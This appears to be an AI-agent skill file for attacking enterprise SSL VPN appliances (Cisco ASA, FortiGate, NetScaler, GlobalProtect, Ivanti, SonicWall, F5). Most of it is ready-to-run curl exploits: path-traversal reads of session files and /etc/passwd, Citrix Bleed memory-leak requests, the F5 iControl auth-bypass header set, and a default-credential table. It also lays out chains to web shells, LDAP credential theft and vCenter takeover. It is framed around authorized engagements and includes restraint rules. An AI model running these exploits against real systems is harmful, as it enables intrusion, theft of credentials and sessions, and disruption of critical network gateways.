---
name: enterprise-vpn-attack
description: External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs.
sources: authorized-engagement, public-advisories, cisa-kev
report_count: 1
---

## When to use this skill

Trigger when recon surfaces:
- `*.<client>.example/+CSCOE+/logon.html` or similar `+CSCOE+` paths → Cisco ASA / AnyConnect
- `intranet.*` / `vpn.*` / `connect.*` / `webvpn.*` / `wc.*` / `remote.*` subdomains
- Port 443 returning login pages with `Server: Apache` or banner like "AnyConnect", "FortiGate", "NetScaler", "GlobalProtect", "Pulse", "Ivanti"
- TCP 8443 / 4443 / 10443 / 8888 (common VPN web-mgmt ports)
- HTTP responses with `Set-Cookie: webvpn=` (Cisco) / `SVPNCOOKIE=` (Fortinet) / `NSC_AAA=` (Citrix) / `DSAuthSession=` (Pulse) / `BIGipServer*` (F5)

Different surface — fingerprint and route, do not force this matrix onto them:
- Post-foothold internal pivot: only when the SoW includes it. External-only and bug-bounty engagements stop at the appliance.
- VPN client-binary bugs (a different class).
- IPsec / L2TP / OpenVPN. Confirm the stack from the banner, then stop. SSL-VPN CVEs do not apply.

---

## Vendor identification (fingerprinting)

### Cisco ASA / AnyConnect
```bash
curl -skI 'https://target/+CSCOE+/logon.html' | head -10
# Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content
# Login page contains: "AnyConnect", "CSCOE", "logon.html"
```
ASA version: not banner-disclosed in modern builds; need to derive from JS file paths or test specific paths.

```bash
# Path-based version hints (older builds leaked builds in URLs)
curl -sk 'https://target/+CSCOE+/sdesktop/scan-finalize?path=test'
curl -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled
curl -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint
```

### Fortinet FortiGate / FortiOS
```bash
curl -skI 'https://target/remote/login' | head -10
# Look for: Set-Cookie: SVPNCOOKIE=, Server header missing or "xxxxxxxx-xxxxx"
# Login page contains: "FortiGate", "Fortinet", "SSL-VPN"
```
Version: `/remote/info` sometimes leaks (older), or `/login?username=` 302 response

### Citrix NetScaler / ADC / Gateway
```bash
curl -skI 'https://target/' | head -10
# Look for: Set-Cookie: NSC_AAA=, Set-Cookie: NSC_USER=, Server: NetScaler
# Login page contains: "NetScaler", "Citrix Gateway"

# Version banner
curl -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'
curl -sk 'https://target/menu/neo'                # 200 if vulnerable to CVE-2019-19781 era
```

### Palo Alto GlobalProtect
```bash
curl -skI 'https://target/global-protect/login.esp' | head -10
# Look for: Set-Cookie: PHPSESSID= (yes, GP uses PHP), Server: Apache (PA-VM internal)
# Page contains: "GlobalProtect Portal", "PAN-OS"

# Version banner via login page
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'GlobalProtect Portal[\s\S]{0,200}'
# Or check meta tag
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'
```

### Pulse Secure / Ivanti Connect Secure
```bash
curl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10
# Look for: Set-Cookie: DSAuthSession=, DSPREAUTH=
# Page contains: "Pulse Secure" or "Ivanti Connect Secure"

# Version
curl -sk 'https://target/dana-na/auth/url_default/welcome.cgi' | grep -oE 'Pulse Connect Secure[^<]*|ivanti[^<]*[0-9.]+'
```

### SonicWall NetExtender / SMA
```bash
curl -skI 'https://target/cgi-bin/welcome' | head -10
# Look for: Set-Cookie: swap=, swapauth=
# Page contains: "SonicWall", "NetExtender", "SMA"
```

### F5 Big-IP / APM
```bash
curl -skI 'https://target/my.policy' | head -10
# Look for: Set-Cookie: BIGipServer*, MRHSession=
# Server: BIG-IP (sometimes)
```

---

## CVE matrix — pre-auth or auth-bypass (2018-2026)

### Cisco ASA / AnyConnect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-0296** | ASA pre-9.x specific builds | Path traversal — info disclosure (sessions, config) | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
| **CVE-2020-3452** | ASA, FTD before specific patch levels | Path traversal — file read (web-services file system only, not OS files) | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../` or the `+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua` variant |
| **CVE-2023-20269** | ASA, FTD specific | Auth bypass / missing lockout on SSL VPN | Do not brute. One login with a group name you already know. Distinct `a0=` codes and no lockout classify the limiter. That classification is not itself a finding. |
| **CVE-2025-20362** | ASA / FTD WebVPN (CISA KEV). Chains with CVE-2025-20333 | Unauth access to restricted WebVPN URLs via path normalisation | One GET below. Proof is body `CSRF token mismatch` (or equivalent authenticated-endpoint text) on a path that should 302 to login. |
| **CVE-2025-20333** | ASA / FTD VPN web server (CISA KEV) | Authenticated buffer overflow → root RCE. Chained from 20362 in the wild | Version-fingerprint against the Cisco advisory. **Do not send an overflow payload** — Cisco documented unpatched devices can *reload* (DoS). |
| **CVE-2024-20481** | RAVPN | DoS via crafted handshake | **SKIP in red team — disruptive** |

```bash
# Cisco CVE-2020-3452 — file read (traversal lives in the query string; no --path-as-is needed)
curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../' | head -20
curl -sk 'https://target/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua' | head -20

# Cisco CVE-2018-0296 — path traversal
curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../' | head -20

# Cisco CVE-2025-20362 — unauth reach of an authenticated files endpoint.
# Rapid7 oracle: 200 + "CSRF token mismatch". Login page / 404 = not this bypass.
# --path-as-is is required. One request. Do not chain into 20333.
curl -sk --path-as-is 'https://target/+CSCOU+/.//../+CSCOE+/files/file_action.html' | head -c 400

# Files commonly retrievable on vulnerable ASA:
# /+CSCOE+/portal_inc.lua    (portal inclusions — may reveal local users)
# /+CSCOE+/session_password.html
# /+CSCOE+/files/files.html
```

### Fortinet FortiGate / FortiOS

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-13379** | FortiOS 5.4-6.0 | Path traversal — sslvpn_websession file read | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow — pre-auth RCE | Complex exploit; test with `nuclei` template `CVE-2022-42475` |
| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow — pre-auth RCE | Public PoCs exist; nuclei template available |
| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write — pre-auth RCE | Public PoC; nuclei template `CVE-2024-21762` |
| **CVE-2024-55591** | FortiOS 7.0.0–7.0.16 and FortiProxy 7.0.0–7.0.19 / 7.2.0–7.2.12. Management interface, not the SSL-VPN portal | Auth bypass to super-admin via the Node.js websocket | Unauthenticated request to `/ws/cli/` (the published bypass appends `local_access_token`) that upgrades to a CLI session. CVE-2025-24472 is the same patch family on a different path. Do not send a config-changing CLI command. Version-fingerprint first. |

```bash
# Fortinet CVE-2018-13379 — most reliably-fingerprintable file read
curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
# Response contains plaintext usernames + sessions if vulnerable

# Fortinet credential dump format (from CVE-2018-13379 dumps that hit pastebin in 2021):
# IP:PORT     username     password     (and others)
```

### Citrix NetScaler / ADC / Gateway

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-19781** (Shitrix) | ADC/Gateway 10.5-13.0 specific | Path traversal → RCE via XML upload | `GET /vpn/../vpns/cfg/smb.conf` |
| **CVE-2022-27518** | ADC/Gateway with SAML configured | Pre-auth RCE | Complex; test with nuclei |
| **CVE-2023-3519** | NetScaler ADC/Gateway 13.0-13.1 specific | Pre-auth RCE via crafted HTTP | Public PoCs exist |
| **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | `POST /oauth/idp/.well-known/openid-configuration` with crafted Host header — long Host header triggers memory leak in response |

```bash
# Citrix Bleed (CVE-2023-4966) — one request.
# Proof is trailing bytes that are not the OpenID JSON (high-entropy / NSC_ cookie material).
# A large body that is still well-formed JSON is not a leak. Do not replay a token you did not create.
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt

# Citrix Bleed 2 (CVE-2025-5777) — different bug, Gateway or AAA vserver.
# Published trigger is a malformed login field (name present, value absent) on
# POST /p/u/doAuthentication.do. One request. Same proof rule: unexpected bytes
# past the normal XML. Do not replay a leaked session. Confirm the build on the Citrix advisory.
curl -sk -X POST 'https://target/p/u/doAuthentication.do' \
  -H 'Content-Type: application/x-www-form-urlencoded' --data 'login' -o /tmp/citrix_bleed2.txt

# CVE-2019-19781 file read
curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
```

### Palo Alto GlobalProtect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2024-3400** | PAN-OS 10.2, 11.0, 11.1 with GlobalProtect gateway or portal. Telemetry-off is not a mitigation. Fixed in 10.2.9-h1, 11.0.4-h1, 11.1.2-h3 and later. | Arbitrary file creation → command injection | Palo Alto's non-exploit check below. Do not send `$(...)`, backticks, or a `/opt/panlogs/tmp/device_telemetry` command payload unless the SoW authorizes one OOB callback — then one unique-marker DNS hit and stop. |

```bash
# CVE-2024-3400 — vendor signature check, not an exploit.
# TCP reset: Threat Prevention signatures are on the path.
# An HTTP response only means those signatures are absent; confirm the PAN-OS build separately.
# The old SESSID=/../../../var/log/pan/test_$(id)_... payload is the wrong directory and is live command injection. Do not send it.
curl -vk -H 'Cookie: SESSID=/../TESTVULN' 'https://target/global-protect/login.esp'
```

Management interface (different port or hostname from the GlobalProtect portal) is a separate surface:

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2025-0108** | PAN-OS management web (not Cloud NGFW / Prisma Access) | Auth bypass to certain PHP scripts. No RCE by itself. | Version against the Palo advisory. One unauthenticated request that returns a script a logged-out client should not see. |
| **CVE-2024-9474** | PAN-OS management web | Privilege escalation, chained in the wild with CVE-2025-0108 | Do not run the chain unless the SoW authorizes one non-destructive proof. Version fingerprint is the default. |

### Pulse Secure / Ivanti Connect Secure / Policy Secure

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-11510** | Pulse Connect Secure 8.x-9.x | Arbitrary file read | `GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/` |
| **CVE-2021-22893** | Pulse Connect Secure 9.x | Pre-auth RCE | Complex multi-step; test with nuclei |
| **CVE-2024-21887** | Ivanti Connect Secure 9.1–22.x | Command injection. The published path is a traversal *under* `/api/v1/totp/user-backup-code/../../…`, chained with CVE-2023-46805. The bare TOTP path is not the bug. | Version fingerprint. One OOB callback only if the SoW authorizes a single proof. No command payload by default. |
| **CVE-2023-46805** | Ivanti Connect Secure 9.1–22.x | Auth bypass that makes 21887 reachable | Same chain. Detection is the version plus an unauthenticated response where an auth check should have fired. |
| **CVE-2025-0282** | Ivanti Connect Secure (CISA KEV, January 2025) | Pre-auth stack overflow → RCE | Version fingerprint against the Ivanti advisory. Do not send an overflow payload. |
| **CVE-2025-22457** | Connect Secure before 22.7R2.6, Policy Secure before 22.7R1.4, ZTA Gateways before 22.8R2.2 (CISA KEV) | Pre-auth stack overflow → RCE | Version fingerprint only. Do not send an overflow payload. |

```bash
# CVE-2019-11510 — Pulse file read
curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'
```

### SonicWall

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection — pre-auth | nuclei template available |
| **CVE-2024-40766** | SonicOS specific | Access-control flaw | Specific firmware versions; confirm on the SonicWall advisory |
| **CVE-2024-53704** | SonicOS 7.1.1-7058 and older, 7.1.2-7019, 8.0.0-8035 (SSLVPN; CISA KEV) | Auth bypass that can hijack an existing VPN session and skip MFA | Version fingerprint. The public technique is a boolean oracle over cookie prefixes — that is keyspace search. Do not walk it. If you hold your own session, one or two checks that a truncated form of *your* cookie is treated as valid is the proof. Stop. |

### F5 Big-IP (control plane — not the APM data-plane portal)

These hit iControl REST / the Configuration utility on the **management or self-IP**, usually `:443` or `:8443`. A `BIGipServer*` cookie on `/my.policy` is the VPN portal, not proof that `/mgmt/` is exposed. Probe `/mgmt/` separately.

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2022-1388** | BIG-IP 16.1.0–16.1.2, 15.1.0–15.1.5, 14.1.0–14.1.4, 13.1.0–13.1.4 (CISA KEV). No data-plane exposure | iControl REST auth bypass → RCE | Login GET below = mgmt reachable (detected). Bypass proof: unauth GET `/mgmt/tm/sys/clock` returning clock JSON when ALL FOUR headers are present — `Authorization: Basic YWRtaW46` (`admin:` + any password), `X-F5-Auth-Token`, `Connection: X-F5-Auth-Token`, and `Host: localhost` (or `X-Forwarded-Host` listed in `Connection`). Missing the `Authorization` header just 401s even on vulnerable boxes. Do **not** POST `/mgmt/tm/util/bash` / `utilCmdArgs` (many nuclei templates do — skip them). |
| **CVE-2023-46747** | BIG-IP Configuration utility (17.1.0–17.1.1 and listed 16.x–13.x). Control plane only | Auth bypass via AJP smuggling, chained to CVE-2023-46748 SQLi | Version against the F5 advisory. nuclei template. Do not send the AJP/smuggle RCE. |

```bash
# F5 — is iControl REST even on this host? (detected, not 1388)
curl -sk 'https://target/mgmt/shared/authn/login' | head -c 200
curl -sk 'https://target:8443/mgmt/shared/authn/login' | head -c 200
# CVE-2022-1388 bypass oracle — clock JSON = bypass. 401 = patched/not applicable. No bash.
# All four conditions required (Horizon3): X-F5-Auth-Token present AND listed in Connection
# (httpd strips it before the backend), Authorization: Basic with user admin + any password
# (YWRtaW46 = "admin:"), and Host: localhost (or X-Forwarded-Host in Connection).
curl -sk -H 'Host: localhost' -H 'Authorization: Basic YWRtaW46' \
  -H 'X-F5-Auth-Token: unused' -H 'Connection: X-F5-Auth-Token, X-Forwarded-Host' \
  'https://target/mgmt/tm/sys/clock' | head -c 300
```

---

## SAML SP / IdP misconfigurations (always check)

Most enterprise VPNs now use SAML for SSO. Check SP metadata:

```bash
# Cisco ASA
curl -sk 'https://target/+CSCOE+/saml/sp/metadata' | head -50

# Fortinet
curl -sk 'https://target/remote/saml/metadata' | head -50

# Citrix
curl -sk 'https://target/saml/login' | head -30
```

Look for:
- `AuthnRequestsSigned="false"` → see `hunt-saml` for XSW exploitation
- `WantAssertionsSigned="false"` → severe; assertion-replay possible
- Audience-restriction validation gaps
- Public SP signing cert (for replay/forging attacks)

---

## Default credentials (test sparingly — lockout risk)

| Vendor | User | Password | Notes |
|---|---|---|---|
| Cisco ASA | admin | cisco | Default factory; rarely seen in prod |
| Cisco ASA | enable_15 | cisco | Console |
| Fortinet | admin | (empty) | Factory default |
| Citrix NetScaler | nsroot | nsroot | Factory default |
| Citrix NetScaler | nsroot | (serial number) | Newer firmware |
| Palo Alto | admin | admin | Factory default |
| Pulse Secure | admin | password | Factory; CIS-hardened changes this |
| F5 Big-IP | root | default | Factory |
| F5 Big-IP | admin | admin | Common alternate |
| SonicWall | admin | password | Factory |

⚠ Most enterprise targets have changed these. Test ≤2 attempts per account to avoid lockout.

---

## Group / tunnel-group enumeration (Cisco-specific)

Cisco ASA AAA groups can sometimes be told apart without valid credentials. Prefer the response body (`a0=` codes in the next section) over timing. A single sample per name is jitter.

If you still time it: n≥10 interleaved trials per name, and the suspect mean must sit ≥2σ above the control mean. A list of a dozen *known* group names from the login form or JS is fine. Do not run a wordlist, and do not pair this with password guesses.

---

## AAA backend identification

After auth fails, look at error response details:

| Pattern in response | AAA backend |
|---|---|
| `a0=2` (Cisco) | Unknown user |
| `a0=3` (Cisco) | Wrong password |
| `a0=4` (Cisco) | Login restricted |
| `a0=12` (Cisco) | Account locked |
| `a0=115` (Cisco) | Generic auth fail (LDAP/RADIUS/AD layer error) |
| AADSTS in response body | Backed by Entra (SAML) |
| `Authentication failed via RADIUS` | RADIUS backend |
| `Invalid username or password` (generic) | LDAP or local DB |

If the flow is SAML/Entra, pivot to `m365-entra-attack` and `hunt-saml`. Do not spray credentials.

---

## Common probe sequence (5-minute fingerprint)

```bash
TARGET="vpn.target.com"

# Cisco
curl -skI "https://$TARGET/+CSCOE+/logon.html" 2>&1 | head -3
curl -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml; ls -la /tmp/cisco_saml.xml
curl -sk "https://$TARGET/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" -o /tmp/cisco_cve.txt; head -c 200 /tmp/cisco_cve.txt
curl -sk --path-as-is "https://$TARGET/+CSCOU+/.//../+CSCOE+/files/file_action.html" | head -c 200

# Fortinet
curl -skI "https://$TARGET/remote/login" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -o /tmp/forti_cve.txt; head -c 200 /tmp/forti_cve.txt

# Citrix
curl -skI "https://$TARGET/" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf" -o /tmp/citrix_cve.txt; head -c 200 /tmp/citrix_cve.txt
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://$TARGET/oauth/idp/.well-known/openid-configuration" -o /tmp/citrix_bleed.txt
# One request. Leak = trailing non-JSON bytes. Do not replay a token from the body.
wc -c /tmp/citrix_bleed.txt

# Palo Alto
curl -skI "https://$TARGET/global-protect/login.esp" 2>&1 | head -3

# Pulse / Ivanti
curl -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt

# F5 management plane (separate from /my.policy)
curl -sk "https://$TARGET/mgmt/shared/authn/login" | head -c 200
```

---

## Nuclei templates for fast triage

Nuclei has high-quality templates for most of the above CVEs. Single command sweeps:

```bash
nuclei -u https://target/ \
  -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \
  -severity high,critical -rl 5
```

Read each template before it runs. Several F5/Fortinet/Ivanti templates POST overflow or `utilCmdArgs` — skip those; use the GET oracles in this skill instead. `-as` is slower and noisier; not a substitute for the per-vendor checks.

---

## Detected vs proven

| Signal | Status |
|---|---|
| Vendor login page / cookie name / SAML metadata | Recon |
| Version string or one CVE path returning 404 | Not "patched". Test ≥3 CVEs per vendor |
| File-read body with unique appliance content (`passwd` hash line, `smb.conf`, session table) | Proven disclosure. One file, stop |
| `CSRF token mismatch` on the 20362 path | Proven unauth reach of an authenticated handler. Do not overflow |
| `/mgmt/` returns `resterrorresponse` | Detected: iControl REST is on the internet. Bypass/RCE is a separate proof |
| Default cred login | Proven only if the session is actually issued. ≤2 attempts |
| Overflow / heap / handshake PoC | Out of scope unless SoW authorizes one OOB callback. Cisco 20333 can DoS the box |

## Operational discipline

- **Banner-stripped servers** are context. On a bug-bounty program they are not a finding. On a red-team or WAPT they can be a defensive observation. A stripped banner is not "patched".
- **Rate-limit yourself** — these appliances often log every request to a SIEM. Patient pace, jittered timing.
- **SAML metadata is anonymous** — pull it. It's intel about AAA backend.
- **Don't run pre-auth-RCE PoCs in red team without explicit OK** — accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.
- **Document the AAA backend identification** — knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths.

---

## Bridge to neighboring skills

- `m365-entra-attack` — when the AAA backend is Entra SAML. Carry the IdP identity across; do not spray passwords.
- `hunt-saml` — XSW / signature-stripping if SAML SP is misconfigured
- `mid-engagement-ir-detection` — appliances generate noisy logs; watch for IPS rules being deployed mid-engagement
- `redteam-mindset` — banner-stripped ≠ "not vulnerable"; keep digging via behavioral fingerprints

---

## Anti-patterns

- **Don't conclude "patched" from a 404 on one CVE path** — patches deploy unevenly; test 3+ CVEs per vendor
- **Don't trust the version banner alone** — appliance vendors often backport fixes without bumping the version string
- **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure
- **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version-banner probes
- **Don't skip SAML metadata** — even when the appliance is patched, SAML SP misconfig is its own attack surface

---

## Related Skills & Chains

- **`hunt-rce`** — Every major VPN appliance (Pulse Secure, Fortinet, Citrix, Ivanti, Palo Alto) has shipped pre-auth path-traversal-to-RCE in the last 24 months. Chain primitive: VPN appliance CVE (e.g., Ivanti ICS CVE-2024-21887, Citrix Bleed CVE-2023-4966, Fortinet CVE-2024-21762) → `hunt-rce` pre-auth path traversal → arbitrary file write into web-root → request the file → web-shell as `root` → VPN config + LDAP bind credentials extracted.
- **`hunt-saml`** — VPN SAML SP misconfig persists even on fully-patched appliances. Chain primitive: appliance patched against latest CVE but `/saml/metadata` reachable → IdP fingerprinted → `hunt-saml` XSW or comment-injection against IdP → forged assertion → VPN session established without password/MFA.
- **`vmware-vcenter-attack`** — Post-VPN-foothold the natural next pivot is vCenter. Chain primitive: VPN web-shell → cred extraction from VPN appliance config (LDAP bind, RADIUS shared secret) → reuse against internal vCenter → if scope permits, `vmware-vcenter-attack` → datacenter takeover.
- **`hunt-ntlm-info`** — Some VPN appliances expose anonymous NTLM on management paths. Chain primitive: VPN admin portal NTLM Type-2 capture → `hunt-ntlm-info` AV_PAIR decode → internal AD forest name → `m365-entra-attack` Entra spray on synced tenant.
- **`mid-engagement-ir-detection`** + **`redteam-report-template`** — VPN appliance CVE exploitation is high-noise; SOC patches fast. Chain primitive: confirmed CVE → baseline capture via `mid-engagement-ir-detection` → if appliance updates mid-test, capture the patched-state as a SECOND finding → run both findings through `triage-validation` → package via `redteam-report-template` with explicit critical-infrastructure framing.
